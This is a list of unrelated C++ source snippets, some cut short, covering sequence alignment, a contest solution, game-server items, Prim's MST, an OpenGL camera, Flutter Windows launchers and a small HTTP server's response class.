    "#include \"StarAligner.hpp\"\r\n#include \"../Utils/Pseudo.hpp\"\r\n#include \"../Utils/Utils.hpp\"\r\n#include \"../Utils/Graph.hpp\"\r\n#include \"../PairwiseAlignment/NeedlemanWunshReusable.hpp\"\r\n\r\n// Function to align sequences using star alignment\r\nstd::vector<std::vector<unsigned char>> star_alignment::StarAligner::align(std::vector<std::vector<utils::Insertion>>& insertions, std::vector<sequence_type>& sequences, size_t thresh, int center) {\r\n    return StarAligner(insertions, sequences, thresh, center)._align();\r\n}\r\n\r\n// Function to get gaps in sequences using star alignment\r\nvoid star_alignment::StarAligner::get_gaps(std::vector<std::vector<utils::Insertion>>& insertions, std::vector<sequence_type>& sequences, size_t thresh, int center) {\r\n    StarAligner(insertions, sequences, thresh, center)._get_gaps();\r\n}\r\n\r\n// Constructor for StarAligner class\r\nstar_alignment::StarAligner::StarAligner(std::vector<std::vector<utils::Insertion>>& insertions, std::vector<sequence_type>& sequences, size_t thresh, int center)\r\n    : thresh1(thresh)\r\n    , Insertions(insertions)\r\n    , _sequences(sequences)\r\n    , _row(_sequences.size())\r\n    , _lengths(_set_lengths())\r\n    , _centre(_set_centre())\r\n    , _centre_len(_sequences[_centre].size()) {\r\n    if (center != -1) {\r\n        _centre = center;\r\n        _centre_len = _sequences[_centre].size();\r\n    }\r\n}\r\n\r\n// Function to set the lengths of sequences\r\nstd::vector<size_t> star_alignment::StarAligner::_set_lengths() const {\r\n    std::vector<size_t> lengths(_row);\r\n    for (size_t i = 0; i != _row; ++i) lengths[i] = _sequences[i].size();\r\n    return lengths;\r\n}\r\n\r\n// Function to set the central sequence\r\nsize_t star_alignment::StarAligner::_set_centre() const {\r\n    size_t centre_index = 0;\r\n    for (size_t i = 1; i != _row; ++i)\r\n        if (_lengths[i] > _lengths[centre_index])\r\n            centre_index = i;\r\n    return centre_index;\r\n}\r\n\r\n// Function to perform alignment\r\nstd::vector<std::vector<unsigned char>> star_alignment::StarAligner::_align() const {\r\n    return _insert_gaps(_merge_results(_pairwise_align()));\r\n}\r\n\r\n// Function to get gaps for alignment\r\nvoid star_alignment::StarAligner::_get_gaps() const {\r\n    mul_pairwise_align();\r\n}\r\n\r\n// Function to perform pairwise alignment\r\nauto star_alignment::StarAligner::_pairwise_align() const -> std::vector<std::array<std::vector<utils::Insertion>, 2>> {\r\n    suffix_array::SuffixArray<nucleic_acid_pseudo::NUMBER> st(_sequences[_centre].cbegin(), _sequences[_centre].cend(), nucleic_acid_pseudo::end_mark); // Create suffix array\r\n    std::vector<std::array<std::vector<utils::Insertion>, 2>> all_pairwise_gaps;\r\n    wfa::WFAlignerGapAffine aligner(2, 3, 1, wfa::WFAligner::Alignment, wfa::WFAligner::MemoryHigh); // Create WFA aligner\r\n    \r\n    for (size_t i = 0; i != _row; ++i) {\r\n        auto common_substrings = _optimal_path(st.get_common_substrings(_sequences[i].cbegin(), _sequences[i].cend(), thresh1));\r\n        \r\n        // Define alignment intervals\r\n        std::vector<quadra> intervals;\r\n        intervals.reserve(common_substrings.size() + 1);\r\n        if (common_substrings.empty()) {\r\n            intervals.emplace_back(quadra({0, _centre_len, 0, _sequences[i].size()}));\r\n        } else {\r\n            if (common_substrings[0][0] || common_substrings[0][1])\r\n                intervals.emplace_back(quadra({0, common_substrings[0][0], 0, common_substrings[0][1]}));\r\n            for (size_t j = 0, end_index = common_substrings.size() - 1; j != end_index; ++j)\r\n                if (common_substrings[j][0] + common_substrings[j][2] != common_substrings[j + 1][0] ||\r\n                    common_substrings[j][1] + common_substrings[j][2] != common_substrings[j + 1][1])\r\n                    intervals.emplace_back(quadra({\r\n                        common_substrings[j][0] + common_substrings[j][2], common_substrings[j + 1][0],\r\n                        common_substrings[j][1] + common_substrings[j][2], common_substrings[j + 1][1]\r\n                    }));\r\n            if (common_substrings.back()[0] + common_substrings.back()[2] != _centre_len ||\r\n                common_substrings.back()[1] + common_substrings.back()[2] != _lengths[i])\r\n                intervals.emplace_back(quadra({\r\n                    common_substrings.back()[0] + common_substrings.back()[2], _centre_len,\r\n                    common_substrings.back()[1] + common_substrings.back()[2], _lengths[i]\r\n                }));\r\n        }\r\n\r\n        // Perform pairwise alignment for each interval\r\n        std::array<std::vector<utils::Insertion>, 2> pairwise_gaps;\r\n        for (size_t j = 0; j != intervals.size(); ++j) {\r\n            const size_t centre_begin = intervals[j][0];\r\n            const size_t centre_end = intervals[j][1];\r\n            const size_t sequence_begin = intervals[j][2];\r\n            const size_t sequence_end = intervals[j][3];\r\n\r\n            auto [lhs_gaps, rhs_gaps] = mywfa(aligner, _sequences[_centre], centre_begin, centre_end,\r\n                _sequences[",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nbool canNavigate(int n, int m, int k, const string& s) {\r\n    int i =-1;\r\n    bool f=false;\r\n    for(int j=m;j>0;j--){\r\n        if(i+j>=n){\r\n            return true;\r\n        }\r\n        if(s[i+j]=='L'){\r\n            i+=j;\r\n            f=true;\r\n            break;\r\n        }\r\n    }\r\n    if(!f){\r\n         for(int j=m;j>0;j--){\r\n        if(i+j>=n){\r\n            return true;\r\n        }\r\n        if(s[i+j]=='W'){\r\n            i+=j;\r\n            f=true;\r\n            break;\r\n        }\r\n    }\r\n\r\n    }\r\n    if(!f){\r\n        return false;\r\n    }\r\n\r\n    while (i < n) {\r\n        while (i < n && s[i] == 'W') {\r\n            k--;\r\n              if (k < 0) {\r\n                return false;\r\n            }\r\n            else{\r\n            i++;\r\n            }\r\n        }\r\n\r\n        if (i < n && s[i] == 'C') {\r\n            return false;\r\n        }\r\n\r\n        bool flag = false;\r\n        if (i < n && s[i] == 'L') {\r\n            for (int j = m; j > 0; j--) {\r\n                if (i + j >= n) {\r\n                    return true;\r\n                } else if (s[i + j] == 'L') {\r\n                    i += j;\r\n                    flag = true;\r\n                    break;\r\n                }\r\n            }\r\n\r\n            if (!flag) {\r\n                for (int j = m; j > 0; j--) {\r\n                    if (i + j >= n) {\r\n                        return true;\r\n                    } else if (s[i + j] == 'W') {\r\n                        i += j;\r\n                        flag = true;\r\n                        break;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        if (!flag&&i<n) {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    int t;\r\n    cin >> t;\r\n    while (t--) {\r\n        int n, m, k;\r\n        cin >> n >> m >> k;\r\n        string s;\r\n        cin >> s;\r\n       // s='L'+s;\r\n        //n=n+1;\r\n\r\n        if (canNavigate(n, m, k, s)) {\r\n            cout << \"YES\" << endl;\r\n        } else {\r\n            cout << \"NO\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// cvendoritem.cpp\n// Copyright Menace Software (www.menasoft.com).\n//\n// Implementation file for the CItemVendable class\n//\n// Initial version by Catharsis.  11/20/1999\n//\n\n#include \"graysvr.h\"\n\nCItemVendable::CItemVendable( ITEMID_TYPE id, CItemBase * pDef ) : CItem( id, pDef )\n{\n\t// Constructor\n\tm_buyprice = 0;\n\tm_sellprice = 0;\n\tm_quality = 0;\n\tm_bBuyFixed = false;\n\tm_bSellFixed = false;\n}\n\nCItemVendable::~CItemVendable()\n{\n\t// Nothing really to do...no dynamic memory has been allocated.\n\tDeletePrepare();\t// Must remove early because virtuals will fail in child destructor.\n}\n\nvoid CItemVendable::DupeCopy( const CItem * pItem )\n{\n\tCItem::DupeCopy( pItem );\n\tconst CItemVendable * pVendItem = dynamic_cast <const CItemVendable *>(pItem);\n\tDEBUG_CHECK(pVendItem);\n\tif ( pVendItem == NULL ) \n\t\treturn;\n\n\tm_buyprice = pVendItem->m_buyprice;\n\tm_sellprice = pVendItem->m_sellprice;\n\tm_quality = pVendItem->m_quality;\n\tm_bBuyFixed = pVendItem->m_bBuyFixed;\n\tm_bSellFixed = pVendItem->m_bSellFixed;\n}\n\nvoid CItemVendable::SetBuyPrice(UINT dwPrice)\n{\n\tif ( dwPrice != 0 )\n\t{\n\t\t// fixing the buy price on this CItemVendable\n\t\tm_buyprice = dwPrice;\n\t\tm_bBuyFixed = true;\n\t}\n\telse\n\t{\n\t\t// Unfixing the buy price on this CItemVendable\n\t\t// Leave the buy price as is for now\n\t\tm_bBuyFixed = false;\n\t}\n}\n\nvoid CItemVendable::SetSellPrice(UINT dwPrice)\n{\n\tif ( dwPrice != 0 )\n\t{\n\t\t// fixing the sell price on this CItemVendable\n\t\tm_sellprice = dwPrice;\n\t\tm_bSellFixed = true;\n\t}\n\telse\n\t{\n\t\t// Unfixing the sell price on this CItemVendable\n\t\t// Leave the sell price as is for now\n\t\tm_bSellFixed = false;\n\t}\n}\n\nvoid CItemVendable::Restock()\n{\n\tif ( ! m_bBuyFixed )\n\t{\n\t\tUINT dwRange = m_pDef->m_buyvaluemax - m_pDef->m_buyvaluemin;\n\t\tif ( dwRange <= 0 )\n\t\t\tm_buyprice = m_pDef->m_buyvaluemin;\n\t\telse\n\t\t\tm_buyprice = m_pDef->m_buyvaluemin + ( rand() % ( dwRange + 1 ));\n\t}\n\tif ( ! m_bSellFixed )\n\t{\n\t\tUINT dwRange = m_pDef->m_sellvaluemax - m_pDef->m_sellvaluemin;\n\t\tif ( dwRange <= 0 )\n\t\t\tm_sellprice = m_pDef->m_sellvaluemin;\n\t\telse\n\t\t\tm_sellprice = m_pDef->m_sellvaluemin + ( rand() % ( dwRange + 1 ));\n\t}\n}\n\nconst TCHAR * CItemVendable::sm_KeyTable[] =\n{\n\t\"BUYPRICE\",\n\t\"QUALITY\",\n\t\"SELLPRICE\",\n};\n\nbool CItemVendable::r_WriteVal(const TCHAR *pKey, CGString &sVal, CTextConsole *pSrc)\n{\n\tswitch ( FindTableSorted( pKey, sm_KeyTable, COUNTOF( sm_KeyTable )))\n\t{\n\tcase 0:\t// BUYPRICE\n\t\tif ( m_bBuyFixed )\n\t\t\tsVal.FormatVal( GetBuyPrice());\n\t\telse\n\t\t\tsVal.FormatVal( 0 );\n\t\treturn true;\n\tcase 1:\t// QUALITY\n\t\tsVal.FormatVal( GetQuality());\n\t\treturn true;\n\tcase 2:\t// SELLPRICE\n\t\tif ( m_bSellFixed )\n\t\t\tsVal.FormatVal( GetSellPrice());\n\t\telse\n\t\t\tsVal.FormatVal( 0 );\n\t\treturn true;\n\t}\n\treturn CItem::r_WriteVal( pKey, sVal, pSrc );\n}\n\nbool CItemVendable::r_LoadVal(CScript &s)\n{\n\tswitch ( FindTableSorted( s.GetKey(), sm_KeyTable, COUNTOF( sm_KeyTable )))\n\t{\n\tcase 0:\t// BUYPRICE\n\t\tSetBuyPrice( s.GetArgVal());\n\t\treturn true;\n\tcase 1:\t// QUALITY\n\t\tSetQuality( s.GetArgVal());\n\t\treturn true;\n\tcase 2:\t// SELLPRICE\n\t\tSetSellPrice( s.GetArgVal());\n\t\treturn true;\n\t}\n\treturn ( CItem::r_LoadVal(s));\n}\n\nvoid CItemVendable::r_Write(CScript &s)\n{\n\tCItem::r_Write(s);\n\tif ( m_bBuyFixed )\n\t\ts.WriteKeyVal( \"BUYPRICE\", GetBuyPrice());\n\tif ( m_bSellFixed )\n\t\ts.WriteKeyVal( \"SELLPRICE\", GetSellPrice());\n\tif ( GetQuality() != 0 )\n\t\ts.WriteKeyVal( \"QUALITY\", GetQuality());\n\treturn;\n}\n\nUINT CItemVendable::GetBuyPrice() const\n{\n\tif ( GetPlayerVendorPrice() )\n\t\treturn GetPlayerVendorPrice();\n\telse\n\t\treturn m_buyprice;\n}\n\nUINT CItemVendable::GetSellPrice() const\n{\n\tif ( GetPlayerVendorPrice() )\n\t\treturn GetPlayerVendorPrice();\n\telse\n\t\treturn m_sellprice;\n}\n\nbool CItemVendable::IsValidNPCSaleItem() const\n{\n\t// This item is in an NPC's vendor box.\n\tif ( m_sellprice == 0 )\n\t\treturn( CItem::IsValidNPCSaleItem());\n\telse\n\t\treturn( CItem::IsValidSaleItem( true ));\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nclass Person {\npublic:\n    Person(const std::string& fname, const std::string& sname)\n        : firstname(fname), secondname(sname) {}\n\n    virtual void printName() const {\n        std::cout << firstname << \" \" << secondname << std::endl;\n    }\n\nprotected:\n    std::string firstname;\n    std::string secondname;\n};\n\nclass Parent : public Person {\npublic:\n    Parent(const std::string& fname, const std::string& sname)\n        : Person(fname, sname) {}\n\n    void printName() const override {\n        std::cout << \"Parent: \" << firstname << \" \" << secondname << std::endl;\n    }\n};\n\nclass Student : public Person {\npublic:\n    Student(const std::string& fname, const std::string& sname)\n        : Person(fname, sname) {}\n\n    void printName() const override {\n        std::cout << \"Student: \" << firstname << \" \" << secondname << std::endl;\n    }\n};\n\nint main() {\n    std::vector<Person*> people;\n    people.push_back(new Parent(\"John\", \"Doe\"));\n    people.push_back(new Student(\"Mary\", \"Doe\"));\n\n    for (const auto& person : people) {\n        person->printName();\n    }\n\n    // Clean up allocated memory\n    for (auto& person : people) {\n        delete person;\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <limits>\n#include <fstream>\n#include <stdexcept>\n\nstruct Graph {\n    int V;\n    std::vector<std::vector<std::pair<int, double>>> adj;\n    bool isDirected;\n\n    Graph(int V, bool directed = false) : V(V), isDirected(directed) {\n        adj.resize(V);\n    }\n\n    void addEdge(int u, int v, double weight) {\n        adj[u].push_back({v, weight});\n        if (!isDirected) {\n            adj[v].push_back({u, weight});\n        }\n    }\n};\n\nstruct MinHeap {\n    std::vector<int> heap;\n    std::vector<int> pos;\n    std::vector<double> chave;\n\n    MinHeap(int V) : heap(V), pos(V), chave(V, std::numeric_limits<double>::max()) {\n        for (int i = 0; i < V; ++i) {\n            heap[i] = i;\n            pos[i] = i;\n        }\n    }\n\n    void heapify(int idx, int size) {\n        int smallest = idx;\n        int left = 2 * idx + 1;\n        int right = 2 * idx + 2;\n\n        if (left < size && chave[heap[left]] < chave[heap[smallest]])\n            smallest = left;\n\n        if (right < size && chave[heap[right]] < chave[heap[smallest]])\n            smallest = right;\n\n        if (smallest != idx) {\n            std::swap(heap[smallest], heap[idx]);\n            pos[heap[smallest]] = smallest;\n            pos[heap[idx]] = idx;\n            heapify(smallest, size);\n        }\n    }\n\n    int extractMin(int &size) {\n        if (size == 0) return -1;\n\n        int minVertex = heap[0];\n        heap[0] = heap[size - 1];\n        pos[heap[0]] = 0;\n        size--;\n\n        heapify(0, size);\n        return minVertex;\n    }\n\n    void decreaseKey(int vertex, double newKey) {\n        int idx = pos[vertex];\n        chave[vertex] = newKey;\n\n        while (idx > 0 && chave[heap[(idx - 1) / 2]] > chave[heap[idx]]) {\n            std::swap(heap[idx], heap[(idx - 1) / 2]);\n            pos[heap[idx]] = idx;\n            idx = (idx - 1) / 2;\n        }\n        pos[vertex] = idx;\n    }\n\n    bool isEmpty(int size) const {\n        return size == 0;\n    }\n};\n\nstd::vector<std::pair<int, int>> primMST(Graph &G, int r) {\n    int V = G.V;\n    std::vector<double> chave(V, std::numeric_limits<double>::max());\n    std::vector<int> predecessor(V, -1);\n    std::vector<bool> inMST(V, false);\n\n    MinHeap heap(V);\n    int size = V;\n\n    chave[r] = 0;\n    heap.decreaseKey(r, 0);\n\n    std::cout << \"Fluxo de execu\u00e7\u00e3o do algoritmo:\\n\";\n\n    while (!heap.isEmpty(size)) {\n        int u = heap.extractMin(size);\n        inMST[u] = true;\n\n        std::cout << \"Extrai: \" << u << \" com chave: \" << chave[u] << \"\\n\";\n\n        for (const auto &[v, weight] : G.adj[u]) {\n            if (!inMST[v] && weight < chave[v]) {\n                chave[v] = weight;\n                predecessor[v] = u;\n                heap.decreaseKey(v, weight);\n\n                std::cout << \"Atualiza: \" << v << \" com nova chave: \" << weight << \", predecessor: \" << u << \"\\n\";\n            }\n        }\n    }\n\n    std::vector<std::pair<int, int>> mstEdges;\n    for (int v = 0; v < V; ++v) {\n        if (predecessor[v] != -1) {\n            mstEdges.push_back({predecessor[v], v});\n        }\n    }\n\n    std::cout << \"Chaves finais:\\n\";\n    for (int i = 0; i < V; ++i) {\n        std::cout << \"V\u00e9rtice \" << i << \": chave = \" << chave[i] << \", predecessor = \" << predecessor[i] << \"\\n\";\n    }\n\n    return mstEdges;\n}\n\nvoid printMST(const std::vector<std::pair<int, int>> &mstEdges) {\n    std::cout << \"Arestas na MST:\\n\";\n    for (const auto &[u, v] : mstEdges) {\n        std::cout << u << \" -- \" << v << \"\\n\";\n    }\n}\n\nvoid printGraph(const Graph &G) {\n    std::cout << \"Grafo lido:\\n\";\n    for (int u = 0; u < G.V; ++u) {\n        std::cout << u << \": \";\n        for (const auto &[v, weight] : G.adj[u]) {\n            std::cout << \"(\" << v << \", \" << weight << \") \";\n        }\n        std::cout << \"\\n\";\n    }\n}\n\nvoid readGraphFile(const std::string &filename, Graph &graph) {\n    std::ifstream file(filename);\n    if (!file.is_open()) {\n        throw std::runtime_error(\"N\u00e3o foi poss\u00edvel abrir o arquivo.\");\n    }\n\n    int type;\n    file >> type;\n    if (type != 0 && type != 1) {\n        throw std::runtime_error(\"Tipo de grafo inv\u00e1lido.\");\n    }\n\n    int numVertices;\n    file >> numVertices;\n    if (numVertices < 0) {\n        throw std::runtime_error(\"N\u00famero de v\u00e9rtices inv\u00e1lido.\");\n    }\n    graph = Graph(numVertices, type == 1);\n\n    int u, v;\n    double weight;\n    while (file >> u >> v >> weight) {\n        if (u < 0 || u >= numVertices || v < 0 || v >= numVertices) {\n            throw std::runtime_error(\"Aresta com v\u00e9rtices fora do intervalo.\");\n        }\n        graph.addEdge(u, v, weight);\n    }\n\n    file.close();\n}\n\nint main() {\n    Graph G(0);\n    try {\n        readGraphFile(\"input.txt\", G);\n        printGraph(G);\n    } catch (const std::exception &e) {\n        std::cerr << \"Erro: \" << e.what() << std::endl;\n        return 1;\n    }\n\n    std::vector<std::pair<int, int>> mstEdges = primMST(G, 0);\n    printMST(mstEdges);\n\n    return 0;\n}\n",
    "///////////////////////////////////////////////////////////////////////////////\r\n// viewmanager.cpp\r\n// ============\r\n// manage the viewing of 3D objects within the viewport - camera, projection\r\n//\r\n//  AUTHOR: Brian Battersby - SNHU Instructor / Computer Science\r\n//\tCreated for CS-330-Computational Graphics and Visualization, Nov. 1st, 2023\r\n///////////////////////////////////////////////////////////////////////////////\r\n\r\n#include \"ViewManager.h\"\r\n\r\n// GLM Math Header inclusions\r\n#include <glm/glm.hpp>\r\n#include <glm/gtx/transform.hpp>\r\n#include <glm/gtc/type_ptr.hpp>    \r\n\r\n// declaration of the global variables and defines\r\nnamespace\r\n{\r\n\t// Variables for window width and height\r\n\tconst int WINDOW_WIDTH = 1000;\r\n\tconst int WINDOW_HEIGHT = 800;\r\n\tconst char* g_ViewName = \"view\";\r\n\tconst char* g_ProjectionName = \"projection\";\r\n\r\n\t// camera object used for viewing and interacting with\r\n\t// the 3D scene\r\n\tCamera* g_pCamera = nullptr;\r\n\r\n\t// these variables are used for mouse movement processing\r\n\tfloat gLastX = WINDOW_WIDTH / 2.0f;\r\n\tfloat gLastY = WINDOW_HEIGHT / 2.0f;\r\n\tbool gFirstMouse = true;\r\n\r\n\t// time between current frame and last frame\r\n\tfloat gDeltaTime = 0.0f; \r\n\tfloat gLastFrame = 0.0f;\r\n\r\n\t// the following variable is false when orthographic projection\r\n\t// is off and true when it is on\r\n\tbool bOrthographicProjection = false;\r\n}\r\n\r\n/***********************************************************\r\n *  ViewManager()\r\n *\r\n *  The constructor for the class\r\n ***********************************************************/\r\nViewManager::ViewManager(\r\n\tShaderManager *pShaderManager)\r\n{\r\n\t// initialize the member variables\r\n\tm_pShaderManager = pShaderManager;\r\n\tm_pWindow = NULL;\r\n\tg_pCamera = new Camera();\r\n\t// default camera view parameters\r\n\tg_pCamera->Position = glm::vec3(0.0f, 5.0f, 12.0f);\r\n\tg_pCamera->Front = glm::vec3(0.0f, -0.5f, -2.0f);\r\n\tg_pCamera->Up = glm::vec3(0.0f, 1.0f, 0.0f);\r\n\tg_pCamera->Zoom = 80;\r\n\tg_pCamera->MovementSpeed = 20;\r\n}\r\n\r\n/***********************************************************\r\n *  ~ViewManager()\r\n *\r\n *  The destructor for the class\r\n ***********************************************************/\r\nViewManager::~ViewManager()\r\n{\r\n\t// free up allocated memory\r\n\tm_pShaderManager = NULL;\r\n\tm_pWindow = NULL;\r\n\tif (NULL != g_pCamera)\r\n\t{\r\n\t\tdelete g_pCamera;\r\n\t\tg_pCamera = NULL;\r\n\t}\r\n}\r\n\r\n/***********************************************************\r\n *  CreateDisplayWindow()\r\n *\r\n *  This method is used to create the main display window.\r\n ***********************************************************/\r\nGLFWwindow* ViewManager::CreateDisplayWindow(const char* windowTitle)\r\n{\r\n\tGLFWwindow* window = nullptr;\r\n\r\n\t// try to create the displayed OpenGL window\r\n\twindow = glfwCreateWindow(\r\n\t\tWINDOW_WIDTH,\r\n\t\tWINDOW_HEIGHT,\r\n\t\twindowTitle,\r\n\t\tNULL, NULL);\r\n\tif (window == NULL)\r\n\t{\r\n\t\tstd::cout << \"Failed to create GLFW window\" << std::endl;\r\n\t\tglfwTerminate();\r\n\t\treturn NULL;\r\n\t}\r\n\tglfwMakeContextCurrent(window);\r\n\r\n\t// tell GLFW to capture all mouse events\r\n\tglfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\r\n\r\n\t// this callback is used to receive mouse moving events\r\n\tglfwSetCursorPosCallback(window, &ViewManager::Mouse_Position_Callback);\r\n\r\n\t// enable blending for supporting tranparent rendering\r\n\tglEnable(GL_BLEND);\r\n\tglBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);\r\n\r\n\tm_pWindow = window;\r\n\r\n\treturn(window);\r\n}\r\n\r\n/***********************************************************\r\n *  Mouse_Position_Callback()\r\n *\r\n *  This method is automatically called from GLFW whenever\r\n *  the mouse is moved within the active GLFW display window.\r\n ***********************************************************/\r\nvoid ViewManager::Mouse_Position_Callback(GLFWwindow* window, double xMousePos, double yMousePos)\r\n{\r\n\t// when the first mouse move event is received, this needs to be recorded so that\r\n\t// all subsequent mouse moves can correctly calculate the X position offset and Y\r\n\t// position offset for proper operation\r\n\tif (gFirstMouse)\r\n\t{\r\n\t\tgLastX = xMousePos;\r\n\t\tgLastY = yMousePos;\r\n\t\tgFirstMouse = false;\r\n\t}\r\n\r\n\t// calculate the X offset and Y offset values for moving the 3D camera accordingly\r\n\tfloat xOffset = xMousePos - gLastX;\r\n\tfloat yOffset = gLastY - yMousePos; // reversed since y-coordinates go from bottom to top\r\n\r\n\t// set the current positions into the last position variables\r\n\tgLastX = xMousePos;\r\n\tgLastY = yMousePos;\r\n\r\n\t//changing the sensitivity so that the mouse control is more precise and smooth\r\n\tfloat sensitivity = 0.2f;\r\n\txOffset *= sensitivity;\r\n\tyOffset *= sensitivity;\r\n\r\n\t\r\n\t// move the 3D camera according to the calculated offsets\r\n\tg_pCamera->ProcessMouseMovement(xOffset, yOffset);\r\n}\r\n\r\n/***********************************************************\r\n *  ProcessKeyboardEvents()\r\n *\r\n *  This method is called to process any keyboard events\r\n *  that may be waiting in the event queue.\r\n ***********************************************************/\r\nvoid ViewManager::Pr",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todoo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"new_new_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"httpresponse.h\"\n\nusing namespace std;\n\n//\u540e\u7f00\u7c7b\u578b  MIMEType\nconst unordered_map<string, string> HttpResponse::SUFFIX_TYPE = {\n    { \".html\",  \"text/html\" },\n    { \".xml\",   \"text/xml\" },\n    { \".xhtml\", \"application/xhtml+xml\" },\n    { \".txt\",   \"text/plain\" },\n    { \".pdf\",   \"application/pdf\" },\n    { \".word\",  \"application/nsword\" },\n    { \".png\",   \"image/png\" },\n    { \".gif\",   \"image/gif\" },\n    { \".jpg\",   \"image/jpeg\" },\n    { \".jpeg\",  \"image/jpeg\" },\n    { \".mpeg\",  \"video/mpeg\" },\n    { \".mpg\",   \"video/mpeg\" },\n    { \".mp3\",   \"audio/mp3\" },\n    { \".mp4\",   \"audio/mp4\" },\n    { \".avi\",   \"video/x-msvideo\" },\n    { \".tar\",   \"application/x-tar\" },\n    { \".css\",   \"text/css \"},\n    { \".js\",    \"text/javascript \"}\n};\n\nconst unordered_map<int, string> HttpResponse::CODE_STATUS = {\n    { 200, \"OK\" },\n    { 400, \"Bad Request\" },\n    { 403, \"Forbidden\" },\n    { 404, \"Not Found\" }\n};\n\nconst unordered_map<int, string> HttpResponse::CODE_PATH = {\n    { 400, \"/error.html\" },\n    { 403, \"/error.html\" },\n    { 404, \"/error.html\" }\n};\n\n\nHttpResponse::HttpResponse() {\n    code_ = -1;\n    path_ = srcDir_ = \"\";\n    isKeepAlive_ = false;\n    mmFile_ = nullptr; \n    mmFileStat_ = { 0 };\n}\n\nHttpResponse::~HttpResponse() {\n    UnmapFile();\n}\n\nvoid HttpResponse::Init(const string& srcDir, string& path, std::unordered_map<std::string, int> post_, bool isKeepAlive, int code){\n    assert(srcDir != \"\");\n    if(mmFile_) { UnmapFile(); }  //\u89e3\u9664\u5185\u5b58\u6620\u5c04\n\n    code_ = code; //\u54cd\u5e94\u72b6\u6001\u7801\n    isKeepAlive_ = isKeepAlive;\n    path_ = path;\n    srcDir_ = srcDir; //\u5f53\u524d\u7684\u5de5\u4f5c\u8def\u5f84\n    mmFile_ = nullptr; \n    mmFileStat_ = { 0 };\n    post__ = post_;\n}\n\nvoid HttpResponse::MakeResponse(Buffer& buff) {\n    /* \u5224\u65ad\u8bf7\u6c42\u7684\u8d44\u6e90\u6587\u4ef6 */\n    //\u62fc\u63a5\u5f97\u5230\u8d44\u6e90\u7684\u8def\u5f84\n    if(stat((srcDir_ + path_).data(), &mmFileStat_) < 0 || S_ISDIR(mmFileStat_.st_mode)) {\n        code_ = 404; //\u8bbf\u95ee\u7684\u662f\u76ee\u5f55\n    }\n    else if(!(mmFileStat_.st_mode & S_IROTH)) { //\u5224\u65ad\u6743\u9650\n        code_ = 403; //\u6ca1\u6709\u6743\u9650\n    }\n    else if(code_ == -1) { //\u9ed8\u8ba4\u662f-1\n        code_ = 200; \n    }\n    ErrorHtml_(); \n    AddStateLine_(buff); \n    AddHeader_(buff); \n    AddContent_(buff); \n    cout<<\"\u5c01\u88c5\u54cd\u5e94\u5b8c\u6210\uff01\"<<endl;\n}\n\nvoid HttpResponse::UnmapFile() {\n    if(mmFile_) {\n        munmap(mmFile_, mmFileStat_.st_size);  //\u89e3\u9664\u5185\u5b58\u6620\u5c04\n        mmFile_ = nullptr;\n    }\n}\n\nchar* HttpResponse::File() {\n    return mmFile_;\n}\n\nsize_t HttpResponse::FileLen() const {\n    return mmFileStat_.st_size;\n}\n\nvoid HttpResponse::ErrorContent(Buffer& buff, string message) \n{\n    string body;\n    string status;\n    body += \"<html><title>Error</title>\";\n    body += \"<body bgcolor=\\\"ffffff\\\">\";\n    if(CODE_STATUS.count(code_) == 1) {\n        status = CODE_STATUS.find(code_)->second;\n    } else {\n        status = \"Bad Request\";\n    }\n    body += to_string(code_) + \" : \" + status  + \"\\n\";\n    body += \"<p>\" + message + \"</p>\";\n    body += \"<hr><em>TinyWebServer</em></body></html>\";\n\n    buff.Append(\"Content-length: \" + to_string(body.size()) + \"\\r\\n\\r\\n\");\n    